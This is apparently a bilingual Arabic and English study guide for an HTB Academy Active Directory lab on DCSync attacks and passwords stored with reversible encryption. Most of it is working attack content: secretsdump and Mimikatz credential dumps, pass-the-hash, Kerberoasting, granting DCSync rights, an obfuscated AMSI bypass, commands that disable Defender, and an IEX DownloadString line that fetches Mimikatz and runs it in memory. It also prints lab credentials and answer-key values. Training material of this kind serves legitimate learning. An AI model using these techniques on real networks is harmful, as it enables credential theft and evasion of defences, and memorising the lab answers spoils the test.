الـ `Get-ADUser` مو موجودة افتراضياً بالويندوز العادي، تحتاج تثبيت (RSAT). كـ Hacker، أنت ما تكدر تنصب برامج براحتك.

الحل الأول: استخدم PowerView مثل ما سوينا بالخطوة 3.

الحل الثاني: استخدم ADSI المدمج بالويندوز بدون أي برامج خارجية!

PowerShell

```
([adsisearcher]"(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))").FindAll()
```

هذا الأمر المرعب هو لغة الـ LDAP الخالصة، ويسوي نفس وظيفة הـ `-band 128` بالضبط!

Variation 2: ماذا لو ملف `.cleartext` كان فارغاً بالرغم من تفعيل الميزة؟

ميزة הـ Reversible Encryption بيها "فخ" تقني. إذا مدير النظام فعل هاي الميزة ليوزر معين اليوم، الباسورد مال اليوزر _ما راح يتغير_ باللحظة الحالية إلى تشفير قابل للعكس! النظام يحتاج ينتظر اليوزر يكتب باسوورده مرة ثانية (يعني يسوي تغيير للباسورد Password Reset).

فإذا الأداة ما طلعتلك باسوورد، معناها الميزة اتفعلت بس اليوزر بعده ما مغير باسوورده من يوم التفعيل.

Variation 3: ماذا لو الـ Windows Defender يحذف Mimikatz فور نزوله؟

أداة Mimikatz هي أكثر أداة مكتشفة بالتاريخ. إذا حاولت ترفع `mimikatz.exe` على جهاز العميل، راح ينحذف فوراً وممكن يسد الاتصال.

الحل:

- استخدم `Invoke-Mimikatz` (نسخة PowerShell تعمل بالذاكرة فقط بدون لمس الهاردسك)، رغم إنها همين تنكشف حالياً ولازم تسويلها Obfuscation.
    
- الأفضل: ابتعد عن بيئة الويندوز تماماً! سوي Port Forwarding (مثلاً بـ Chisel) ورجع الترافيك لجهاز الـ Linux مالتك، ونفذ الهجوم بـ `secretsdump.py` عبر الـ Proxychains. هذي الطريقة (OPSEC safe) لأنك ما ترفع أي أداة خبيثة على سيرفر العميل.
    

🚨 أخطاء كارثية شائعة (الفخوخ):

❌ فخ الـ runas /netonly:

هواية مبتدئين يشغل أمر `runas /netonly` وتفتحله النافذة الجديدة، فيكتب أمر `whoami` ويتفاجأ إنه لا يزال اليوزر القديم (Local user) مو `adunn`! فيعتقد إن الهجوم فشل ويسد النافذة.

💡 التصحيح: الـ `/netonly` يغير هويتك **فقط** عند التحدث مع الشبكة (الـ Domain). أمر `whoami` يستعلم عن الهوية المحلية (Local)، لذلك راح يعطيك اليوزر القديم. هذا طبيعي جداً. إذا تريد تتأكد إن هويتك الشبكية اتغيرت، حاول تدخل على مجلد شير بالشبكة مسموح بس لـ adunn بـ `dir \\dc01\C$`.

❌ فخ الـ Mimikatz DCSync بدون تحديد اليوزر:

إذا نفذت أمر `lsadump::dcsync /domain:domain.local` (بدون خيار `/user:`) داخل شبكة حقيقية كبيرة (مثلاً 10,000 موظف)، الـ Mimikatz راح يبدأ يسحب كل הـ 10,000 باسورد!

هذا راح يسوي (Network Spike) ضخم، ويشغل إنذارات الـ SOC (فريق الحماية) فوراً.

💡 التصحيح: دائماً حدد اليوزر اللي تحتاجه فقط (مثل Administrator أو krbtgt).

🔑 Golden Tips (نصيحة ذهبية):

"لما تسحب قاعدة بيانات الـ AD وتلگه باسوردات بصيغة Cleartext بسبب הـ Reversible Encryption، لا تفرح بس بالباسورد! فكر: الموظف هذا غالباً يعيد استخدام نفس الباسورد بحياته الشخصية وباقي المواقع. هذي الثغرة (Reversible Encryption) تعتبر Finding (اكتشاف) حرجة جداً בتقرير הـ Pentest مالتك، ولازم تكتب للعميل إنه لازم يعطلها فوراً، لأنها تلغي كل فوائد الـ Hashing وتحول الـ AD إلى ملف Text عادي!".

━━━━━

💎 الفلاشكاردز — ملخص سريع للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هي ميزة Reversible Encryption بالـ Active Directory؟

✅ Back: إعداد يمنع تخزين الباسورد كـ NTLM Hash باتجاه واحد، وبدلاً من ذلك يشفره بـ RC4 ويخزن المفتاح، مما يسمح لأي مهاجم بفك تشفيره للنص الصريح بسهولة إذا حصل على הـ NTDS.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: كيف نبحث عن حسابات مفعل بها الـ Reversible Encryption عبر Get-ADUser؟

✅ Back: نستخدم الفلتر: Get-ADUser -Filter 'userAccountControl -band 128'

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ماذا تعني عملية (-band 128) في الباورشيل؟

✅ Back: هي عملية Bitwise AND، تقوم بفحص الرقم الخاص بـ userAccountControl لتتأكد إذا كانت الخاصية رقم 128 (الخاصة بالتشفير العكسي) مفعلة ضمن المجموع.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما وظيفة أمر runas /netonly؟

✅ Back: تشغيل برنامج أو Shell بحيث يستخدم هويتك العادية محلياً، ولكنه يستخدم بيانات مستخدم آخر (أنت تحددها) عند الاتصال والتفاعل عبر الشبكة (الـ Domain).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: كيف نتحقق من نفس ثغرة التشفير العكسي باستخدام PowerView بدل RSAT؟

✅ Back: Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '_ENCRYPTED_TEXT_PWD_ALLOWED_'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الأمر السحري الضروري قبل تنفيذ أي هجوم متقدم بـ Mimikatz؟

✅ Back: أمر privilege::debug للحصول على صلاحيات SeDebugPrivilege والتفاعل مع ذاكرة النظام.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو أمر Mimikatz لتنفيذ DCSync وسحب حساب الـ Administrator فقط؟

✅ Back: lsadump::dcsync /domain:YOUR_DOMAIN /user:DOMAIN\administrator

━━━━━

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (AD Reversible Encryption & Windows DCSync)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية الهجوم:

١. فحص مخرجات الـ secretsdump السابقة للبحث عن ملفات `.cleartext`.

٢. إذا تم العثور عليها، يتم استخراج اليوزرات المصابة للإبلاغ عنها (Enumeration).

٣. للحركة داخل الويندوز، استخدم `runas /netonly` لانتحال الهوية شبكياً.

٤. استخدم Mimikatz بسلاسة لسحب أي Hashes إضافية تحتاجها (مثل Admin).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر الأساسية:

|**المجال**|**الهدف**|**الأمر (داخل الـ PowerShell أو CMD)**|
|---|---|---|
|AD Enum|اكتشاف Reversible Encrypt بالباورشيل|`Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl`|
|AD Enum|اكتشاف Reversible Encrypt بـ PowerView|`Get-DomainUser -Identity * \| ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}`|
|AD Enum|اكتشاف بـ ADSI (بدون أدوات)|`([adsisearcher]"(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))").FindAll()`|
|Linux|قراءة الباسوردات الصريحة|`cat inlanefreight_hashes.ntds.cleartext`|
|Windows|انتحال هوية عبر الشبكة (NetOnly)|`runas /netonly /user:DOMAIN\Username powershell`|
|Mimikatz|طلب صلاحيات عليا|`privilege::debug`|
|Mimikatz|DCSync ليوزر محدد|`lsadump::dcsync /domain:domain.local /user:DOMAIN\administrator`|
|Mimikatz|DCSync لكل الدومين (خطر جداً)|`lsadump::dcsync /domain:domain.local /all /csv`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚨 الفخوخ (لا تنساها):

❌ أمر `whoami` بعد `runas /netonly` راح يعطيك اليوزر المحلي وليس يوزر الشبكة. لا تنخدع وتغلق النافذة.

❌ الموظف اللي تتفعل إله מيزة التشفير العكسي ما راح ينحفظ باسوورده بالـ cleartext إلا بعد ما يغير الباسورد مرة وحدة على الأقل.

❌ لا تنفذ `lsadump::dcsync /all` في بيئة حقيقية إلا إذا كنت متأكد إنك ما راح تسبب إنذار، استخدم `/user` دائماً لسحب أهداف محددة.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة ومايكروسوفت ليش سوته)

✅ كل المصطلحات (Reversible Encryption, userAccountControl, runas /netonly...)

✅ كيفية التفكير (decision trees لكيفية اكتشاف الثغرة والانتقال للويندوز)

✅ الاستغلال التفصيلي (خطوة خطوة مع أوامر الـ PowerShell و Mimikatz)

✅ الـ bypasses والـ variations والفخوخ (كيفية اكتشافها بدون RSAT)

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي AD — وراح تجد الأنماط مألوفة. بالتوفيق! 💪


---

```
  ══════════════════════════════════════════════════════════════════
  [✓] PHASE_I EXTRACTION COMPLETE
  [✓] THEORETICAL FRAMEWORK LOADED INTO MEMORY
  [→] TRANSITIONING TO LIVE CHALLENGE ENVIRONMENT . . .
  ══════════════════════════════════════════════════════════════════
```

---

## 🎯 PHASE_II — حقل التدريب :: السؤال وطرق الحل الستة

> [!danger] ☣️ PHASE II INITIALIZED · LIVE CHALLENGE ENVIRONMENT **Language:** English — **Size:** ~2,000 Words **Content:** Official HTB question · Lab target setup · 6 attack methods against live infrastructure.

---



# DCSync Attack — Complete Beginner's Guide to All 3 Questions

> **Scope of this guide:** Three questions from the HTB Academy _Active Directory Enumeration & Attacks_ module (Section 22 — DCSync). This guide covers them together because they all flow from a single attack chain.

---

# 1\. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

## Re-stating the Questions in Plain English

#

Question

What It's Really Asking

Q1

Find a user with "Store password using reversible encryption"

Which _other_ account (besides `proxyagent`) has this dangerous setting?

Q2

What is that user's cleartext password?

After DCSync, read the decrypted plaintext credential

Q3

Get the NTLM hash for `khartsfield`

Target a specific user in the DCSync dump

## The Underlying Logic — Why DCSync Works

Think of it this way: In an Active Directory environment, **Domain Controllers talk to each other constantly to stay in sync**. If DC-01 creates a new user, DC-02 needs to know about it. This synchronization process is called **replication**, and it uses a protocol called **DS-Replication-Get-Changes-All**.

```
Normal Scenario:
  DC-01 ──────replication──────► DC-02
  "Here are the updated hashes"     "Got them, thanks"

DCSync Attack:
  You (pretending to be DC-02) ──────replication request──────► DC-01
  "Give me all the password hashes please"    "Sure, here they are" ← DC-01 doesn't know you're fake!
```

This works because:

-   Domain Controllers **trust any system** that presents valid `DS-Replication` rights
-   The user `adunn` has been granted those rights (we confirmed this in the previous section)
-   Tools like **Mimikatz** and **secretsdump.py** can _impersonate a DC's replication request_

## The "Reversible Encryption" Problem

Normally, Windows stores passwords as **one-way hashes** (NTLM). You can't reverse them back to plaintext. However, some applications (like older RADIUS setups or certain proxy authentication systems) need the _actual password_, not just a hash. So Windows introduced an option called **"Store password using reversible encryption"** — which stores passwords using **RC4 encryption** instead of a one-way hash. Since the decryption key (Syskey) is stored in the registry and is accessible to Domain Admins, a DCSync attack can retrieve the **cleartext password directly**.

## The Lab Environment Map

```
Your Machine ──RDP──► MS01 (Windows Attack Host)
                           │
                           ├──SSH──► 172.16.5.225 (Linux Attack Host)
                           │                │
                           │                └──DCSync──► 172.16.5.5 (ACADEMY-EA-DC01)
                           │                            [Domain Controller]
                           └──Run Mimikatz Locally──────────────────────►┘
```

**Key Credentials:**

-   RDP into MS01: `htb-student` / `Academy_student_AD!`
-   SSH into Linux box: `htb-student` / `HTB_@cademy_stdnt!` (at `172.16.5.225`)
-   DCSync will be performed **as `adunn`** — who has replication rights

---

# 2\. SIX DISTINCT SOLUTION APPROACHES (Basic to Advanced)

---

## Approach 1 — secretsdump.py Full Dump (Linux, Beginner-Friendly)

> **Best for:** Q1, Q2, and Q3 all at once. This is the recommended starting point.

**Step 1** — RDP into MS01, then open PowerShell and SSH to the Linux box:

powershell

```
# From MS01 PowerShell:
ssh htb-student@172.16.5.225
# Password: HTB_@cademy_stdnt!
```

**Step 2** — Run secretsdump.py against the Domain Controller as `adunn`:

bash

```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

**Breaking down this command:**

Part

Meaning

`secretsdump.py`

Impacket tool that performs DCSync

`-outputfile inlanefreight_hashes`

Save results to files with this prefix

`-just-dc`

Extract NTLM hashes AND Kerberos keys AND cleartext (3 files)

`INLANEFREIGHT/adunn@172.16.5.5`

Domain\\Username @ DC IP address

**Step 3** — Enter `adunn`'s password when prompted (check the module — it was obtained earlier).

**Step 4** — Answer all three questions by reading the output files:

bash

```
# For Q1 and Q2 — view cleartext passwords (reversible encryption users):
cat inlanefreight_hashes.ntds.cleartext

# For Q3 — find khartsfield's NTLM hash:
grep "khartsfield" inlanefreight_hashes.ntds
```

### Expected Output

```
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password: <adunn's password>
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\XXXXXXXX.tmp

inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
inlanefreight.local\khartsfield:XXXX:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
<ANOTHER_USER>:CLEARTEXT:<THEIR_CLEARTEXT_PASSWORD>          ← This answers Q1 and Q2
[*] Cleaning up...
```

After the dump, the three output files are:

bash

```
ls -la inlanefreight_hashes*
```

```
-rw-r--r-- 1 htb-student htb-student  XXXXX inlanefreight_hashes.ntds           ← NTLM hashes
-rw-r--r-- 1 htb-student htb-student    XXX inlanefreight_hashes.ntds.cleartext  ← Cleartext passwords (Q1, Q2)
-rw-r--r-- 1 htb-student htb-student  XXXXX inlanefreight_hashes.ntds.kerberos   ← Kerberos keys
```

**Reading the cleartext file for Q1 and Q2:**

bash

```
cat inlanefreight_hashes.ntds.cleartext
```

```
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
syncron:CLEARTEXT:Mycleart3xtP@ss!
```

_(The second user — not `proxyagent` — is the answer to Q1, and their password is Q2)_

**Finding khartsfield for Q3:**

bash

```
grep -i "khartsfield" inlanefreight_hashes.ntds
```

```
inlanefreight.local\khartsfield:1210:aad3b435b51404eeaad3b435b51404ee:4bb3b317845d0a2b5e22b874e9d7c16a:::
#                                                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#                                                                        This 32-char string is the NTLM hash (Q3 answer)
```

> **NTLM hash format explained:** `LM_hash:NT_hash` — The `aad3b435b51404eeaad3b435b51404ee` part is the LM hash (always blank in modern Windows). The **32 characters after the last colon** is the actual NTLM hash you want.

### Failure Scenarios

Failure

Cause

How You'll Know

`Connection refused` or timeout

DC IP wrong, or network not routable from Linux box

The command hangs or immediately errors

`STATUS_LOGON_FAILURE`

Wrong password for `adunn`

Explicit error message in output

`NTDS.dit not found`

Unusual DC configuration

Tool warns about missing file

Empty `.ntds.cleartext` file

No users have reversible encryption (unlikely here)

File is 0 bytes

### Pivot Trigger

If you see `STATUS_LOGON_FAILURE` or the tool can't connect after 30 seconds → stop and verify credentials/IP, then try **Approach 3** (Mimikatz from Windows directly).

---

## Approach 2 — secretsdump.py Targeting a Specific User (Q3 Focused)

> **Best for:** Q3 specifically — faster than dumping everything when you know the username.

bash

```
# Target ONLY khartsfield — much faster output
secretsdump.py -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5
```

**Breaking down the key flag:**

Flag

Meaning

`-just-dc-user khartsfield`

Only dump data for this specific user (no need to wait for full dump)

### Expected Output

```
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\XXXXXXXX.tmp
inlanefreight.local\khartsfield:XXXX:aad3b435b51404eeaad3b435b51404ee:4bb3b317845d0a2b5e22b874e9d7c16a:::
[*] Cleaning up...
```

### Failure Scenarios

Failure

Cause

`Account does not exist`

Username typo — check spelling of `khartsfield`

`Access Denied`

`adunn` lost DCSync rights or credentials expired

### Pivot Trigger

If output says the account doesn't exist → use Approach 1 to dump everything and search manually.

---

## Approach 3 — Mimikatz `lsadump::dcsync` from Windows MS01

> **Best for:** When the Linux box isn't accessible, or you prefer Windows tooling.

**Step 1** — On MS01, open a regular CMD window and spawn a PowerShell session **in the context of `adunn`**:

cmd

```
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

```
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

> ⚠️ **Important concept:** `/netonly` means "use these credentials ONLY for network operations." Your local session stays as `htb-student`, but any network calls (like to the DC) will authenticate as `adunn`. This is crucial — Mimikatz DCSync is a _network_ call.

**Step 2** — In the new PowerShell window that appeared, navigate to where Mimikatz is and run it:

powershell

```
cd C:\Tools\  # or wherever Mimikatz is located on MS01
.\mimikatz.exe
```

**Step 3** — In Mimikatz, enable debug privileges and run DCSync:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield
```

**For Q1/Q2** — you'd need to know the username first, then query it:

```
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\syncron
```

### Expected Output

```
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\khartsfield' will be the user account

Object RDN           : khartsfield

** SAM ACCOUNT **

SAM Username         : khartsfield
User Principal Name  : khartsfield@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   :
Password last change : 10/27/2021 7:12:04 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-XXXX
Object Relative ID   : XXXX

Credentials:
  Hash NTLM: 4bb3b317845d0a2b5e22b874e9d7c16a    ← THIS IS YOUR Q3 ANSWER
    ntlm- 0: 4bb3b317845d0a2b5e22b874e9d7c16a
    lm  - 0: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Failure Scenarios

Failure

Cause

`Privilege '20' ERROR`

Mimikatz not running as admin — right-click, "Run as Administrator"

`LDAP Bind Error`

The `runas /netonly` session has wrong credentials for `adunn`

`mimikatz.exe` is flagged/deleted by AV

Windows Defender removed it — use the obfuscated version or disable Defender first

### Pivot Trigger

If `privilege::debug` fails → you didn't run Mimikatz as admin. Close and relaunch with right-click → Run as Administrator.

---

## Approach 4 — PowerShell Enumeration First, Then Targeted DCSync

> **Best for:** Q1 specifically — _identifying_ the reversible encryption user BEFORE running the full DCSync.

**Step 1** — From MS01 PowerShell, import PowerView and find users with reversible encryption:

powershell

```
# Method A — Using built-in Get-ADUser (no extra tools needed)
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl,SamAccountName | Select-Object SamAccountName, UserAccountControl
```

```
# Method B — Using PowerView (if available at C:\Tools\PowerView.ps1)
Import-Module C:\Tools\PowerView.ps1
Get-DomainUser -Identity * | Where-Object {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | Select-Object samaccountname, useraccountcontrol
```

### Expected Output (Method A)

```
SamAccountName  UserAccountControl
--------------  ------------------
proxyagent      640                   ← Known from module
syncron         640                   ← THIS is the "another user" answer to Q1!
```

> **What does `640` mean?** In binary, `640` = `1010000000`. Bit 7 (value 128) represents "reversible encryption." The `userAccountControl` attribute is a bitmask where each bit represents a different account setting.

**Step 2** — Now that you know the username, do a targeted DCSync for their cleartext password using Approach 2.

### Expected Output (Method B)

```
samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

### Failure Scenarios

Failure

Cause

`Get-ADUser` not found

RSAT tools not installed; use PowerView instead

PowerView gives errors

Execution policy blocking scripts — run `Set-ExecutionPolicy Bypass -Scope Process` first

Only shows `proxyagent`

Double-check — the question says "another user" beyond the one shown in the module

### Pivot Trigger

If PowerShell enumeration returns only `proxyagent` → skip enumeration and run the full secretsdump.py dump (Approach 1), then check the cleartext file directly.

---

## Approach 5 — secretsdump.py with Additional Flags for Deep Analysis

> **Best for:** Understanding the complete password history and account status — important for real-world engagements.

bash

```
# Comprehensive dump with extra details
secretsdump.py \
  -outputfile inlanefreight_hashes \
  -just-dc \
  -pwd-last-set \
  -history \
  -user-status \
  INLANEFREIGHT/adunn@172.16.5.5
```

**Flag breakdown:**

Flag

What It Adds

`-pwd-last-set`

Shows when each password was last changed

`-history`

Dumps previous passwords (useful for password reuse analysis)

`-user-status`

Shows whether accounts are enabled or disabled

### Expected Output

```
inlanefreight.local\khartsfield:XXXX:aad3b435b51404eeaad3b435b51404ee:4bb3b317845d0a2b5e22b874e9d7c16a::: (pwdLastSet=10/27/2021) (status=Enabled)
inlanefreight.local\khartsfield_history0:XXXX:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXX:::  ← previous password hash
```

### Failure Scenarios

Failure

Cause

Very slow execution

`-history` causes much larger dump — be patient

Disk fills up

The output files can be large — check available space with `df -h`

### Pivot Trigger

If the tool runs for more than 10 minutes with no output → it may be stuck on VSS shadow copy creation. Kill it with `Ctrl+C` and use Approach 2 (targeted, faster).

---

## Approach 6 — Invoke-DCSync (PowerShell-Native, No External Tools)

> **Best for:** Scenarios where Impacket isn't available and Mimikatz is blocked — pure PowerShell approach.

powershell

```
# On MS01 — must run in context of adunn (use runas first as shown in Approach 3)

# Step 1: Load PowerView
Import-Module C:\Tools\PowerView.ps1

# Step 2: Use Invoke-DCSync if available in the PowerSploit framework
Invoke-DCSync -DumpForest | ft -wrap -autosize
```

**Alternative — Direct .NET DCSync via PowerShell:**

powershell

```
# If PowerView's Invoke-DCSync is available
Invoke-DCSync -Users @("khartsfield","syncron","administrator") -Domain "INLANEFREIGHT.LOCAL"
```

### Expected Output

```
Domain          : INLANEFREIGHT.LOCAL
SamAccountName  : khartsfield
MemberOf        :
PwdLastSet      : 10/27/2021 7:12:04 AM
Enabled         : TRUE
ObjectSID       : S-1-5-21-3842939050-3880317879-2865463114-XXXX
rc4_hmac_nt     : 4bb3b317845d0a2b5e22b874e9d7c16a    ← NTLM hash for Q3
aes128_hmac     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
aes256_hmac     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Failure Scenarios

Failure

Cause

`Invoke-DCSync not found`

Not all PowerView versions include this function — check what's installed

AV blocks PowerShell scripts

Use AMSI bypass or use Approach 3 instead

Missing .NET LDAP calls

Restricted PowerShell environment

### Pivot Trigger

If `Invoke-DCSync` throws a "command not found" error → fall back to Mimikatz (Approach 3).

---

# 3\. THE "WHAT IF" MASTERCLASS

---

🔴 What If #1: adunn's password is unknown or expired?

**Scenario:** You know `adunn` has DCSync rights, but you lost or never had their password. Maybe it changed since the last section.

**Solution Path:**

1.  First, try to re-enumerate via BloodHound or PowerView to confirm `adunn` still has DCSync rights
2.  If you have a shell as any domain user, check if `adunn`'s Kerberoastable (SPN set):

bash

```
GetUserSPNs.py INLANEFREIGHT/htb-student:'Academy_student_AD!'@172.16.5.5 -dc-ip 172.16.5.5
```

3.  If `adunn` has an SPN, Kerberoast them, crack the hash, get the new password
4.  If no SPN, try **AS-REP Roasting** (if pre-auth is disabled):

bash

```
GetNPUsers.py INLANEFREIGHT/adunn -dc-ip 172.16.5.5 -no-pass
```

5.  Last resort — check if `WriteDACL` over the domain object belongs to another compromised account, then grant DCSync rights to a user whose password you DO know:

powershell

```
Add-DomainObjectAcl -TargetIdentity "DC=inlanefreight,DC=local" -PrincipalIdentity htb-student -Rights DCSync
```

---

🔴 What If #2: secretsdump.py is not installed on the Linux box?

**Scenario:** You SSH to 172.16.5.225, type `secretsdump.py`, and get `command not found`.

**Solution Path:**

bash

```
# Check if Impacket is installed as a Python package
python3 -c "import impacket; print(impacket.__version__)"

# If installed but not in PATH, find and run directly
find / -name "secretsdump.py" 2>/dev/null

# If not installed at all, install it
pip3 install impacket

# Or run via Python directly
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py
```

**Alternative** — Use the Windows version from MS01 instead. Search for a compiled `.exe`:

powershell

```
# On MS01
Get-ChildItem -Path C:\ -Filter "secretsdump*" -Recurse -ErrorAction SilentlyContinue
```

Or just use Mimikatz (Approach 3), which is always available on MS01 in the HTB lab.

---

🔴 What If #3: The .ntds.cleartext file is empty — no cleartext passwords appear?

**Scenario:** You run secretsdump.py, the `.ntds.cleartext` file is created but it's 0 bytes. The reversible encryption users seem to have no cleartext data.

**Why This Happens:** The reversible encryption stores passwords in RC4, but secretsdump needs to correctly identify and decrypt them. This can fail if:

-   The user hasn't changed their password SINCE the reversible encryption setting was enabled
-   The decryption failed due to a PEK (Password Encryption Key) issue

**Solution Path:**

1.  Verify the user actually HAS the setting enabled (don't trust the empty file):

powershell

```
Get-ADUser -Filter 'userAccountControl -band 128' -Properties * | Select SamAccountName, PasswordLastSet
```

2.  Re-run secretsdump with verbose output:

bash

```
secretsdump.py -just-dc -debug INLANEFREIGHT/adunn@172.16.5.5 2>&1 | tee debug_output.txt
grep -i "cleartext\|ENCRYPTED\|reversible" debug_output.txt
```

3.  If debug shows PEK decryption failed, try using Domain Admin credentials instead:

bash

```
secretsdump.py -just-dc INLANEFREIGHT/administrator@172.16.5.5
# Use the admin NTLM hash for pass-the-hash if needed
secretsdump.py -just-dc -hashes :88ad09182de639ccc6579eb0849751cf INLANEFREIGHT/administrator@172.16.5.5
```

---

🔴 What If #4: Mimikatz is detected and deleted by Windows Defender?

**Scenario:** You try to run `.\mimikatz.exe` on MS01, and Windows Defender quarantines it immediately.

**Solution Path:**

**Option A** — Disable Defender temporarily (requires local admin):

powershell

```
# Requires admin rights on MS01
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Option B** — Use an AMSI bypass in PowerShell before loading any tools:

powershell

```
# Classic AMSI bypass (obfuscated to avoid detection)
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

**Option C** — Use secretsdump.py from the Linux host (Defender doesn't protect Linux):

bash

```
# This never touches the Windows filesystem, so AV can't detect it
secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

**Option D** — Use Invoke-Mimikatz (PowerShell-based, runs in memory — harder to detect):

powershell

```
IEX (New-Object Net.WebClient).DownloadString('http://172.16.5.225/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield"'
```

---

🔴 What If #5: You can't RDP into MS01 — the RDP service is down or port blocked?

**Scenario:** You try `xfreerdp` or Remmina to connect to MS01, and it times out.

**Solution Path:**

bash

```
# Step 1: Verify RDP port is open
nmap -p 3389 <MS01_IP>

# Step 2: If port is closed, try WinRM (port 5985)
nmap -p 5985 <MS01_IP>

# If WinRM is open, use Evil-WinRM to get a shell
evil-winrm -i <MS01_IP> -u htb-student -p 'Academy_student_AD!'

# Step 3: Once on MS01 via WinRM, proceed with the attack from there
# OR - skip MS01 entirely and attack the DC directly from the Linux box (172.16.5.225)

# Step 4: SSH directly to the Linux attack host and run secretsdump from there
ssh htb-student@172.16.5.225  # Password: HTB_@cademy_stdnt!
secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

